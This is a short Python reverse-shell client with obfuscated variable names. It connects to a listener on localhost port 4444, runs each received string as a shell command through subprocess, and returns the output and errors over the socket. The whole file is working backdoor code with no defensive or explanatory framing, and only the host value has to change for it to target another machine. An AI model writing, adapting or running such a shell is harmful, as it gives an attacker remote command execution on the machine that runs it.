import socket
import subprocess

try:
    gsjfhdkjghs5 = 'localhost'
    h4ui3hf2 = 4444
    v43h34iu5 = socket.socket()
    v43h34iu5.connect((gsjfhdkjghs5, h4ui3hf2))

    while True:
        gsf5ugh5us3 = v43h34iu5.recv(100000000)
        gsf5ugh5us3 = gsf5ugh5us3.decode()
        gsh5u4g4 = subprocess.Popen(gsf5ugh5us3, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
        sfgshkgs43 = gsh5u4g4.stdout.read()
        gsysi4gy4 = gsh5u4g4.stderr.read()
        #print(sfgshkgs43 + gsysi4gy4)
        print(f"output: {sfgshkgs43}")
        print(f"output error: {gsysi4gy4}")
        print(f"command: {gsf5ugh5us3}")
        if len(sfgshkgs43) < 4:
            print("[-] The output is none.")
            v43h34iu5.send(bytes("Null", "utf-8"))
            v43h34iu5.send(gsysi4gy4)
        else:
            print("[+] command succesfully works WITH OUTPUT.")
            v43h34iu5.send(sfgshkgs43)
            v43h34iu5.send(gsysi4gy4)

except Exception as e:
    print(e)
    print("not working LOL")
    pass
